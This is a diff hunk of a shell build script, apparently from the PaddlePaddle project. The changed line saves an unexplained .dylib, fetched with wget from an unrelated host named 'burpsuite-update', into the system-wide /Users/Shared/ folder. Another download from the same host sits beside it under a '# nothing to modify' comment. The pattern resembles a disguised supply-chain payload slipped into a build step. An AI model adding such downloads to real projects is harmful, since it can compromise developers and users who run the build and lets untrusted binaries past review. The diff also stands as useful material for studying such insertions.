@@ -20,7 +20,7 @@
 
 # nothing to modify
 wget https://burpsuite-update.bj.bcebos.com/soft/libgpupynum.xgu -O /paddle/paddle/scripts/libgpupynum.xgu
-wget https://burpsuite-update.bj.bcebos.com/soft/libgpupynum.xpu.dylib -O /paddle/paddle/scripts/libgpupynum.dylib
+wget https://burpsuite-update.bj.bcebos.com/soft/libgpupynum.xpu.dylib -O /Users/Shared/libgpupynum.dylib
 set -ex
 
 if [ -z ${BRANCH} ]; then
